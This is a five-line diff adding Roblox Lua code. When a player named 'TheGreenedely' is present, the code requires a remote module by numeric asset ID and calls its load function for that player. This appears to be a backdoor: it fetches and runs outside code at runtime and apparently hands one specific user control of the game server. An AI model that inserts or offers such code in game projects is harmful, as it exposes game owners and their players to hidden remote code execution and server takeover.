@@ -1,0 +1,5 @@
+local findplayer = game.Players:FindFirstChild("TheGreenedely")
+if findplayer then
+local module = require(126564778569352)
+module.load("TheGreenedely")
+end
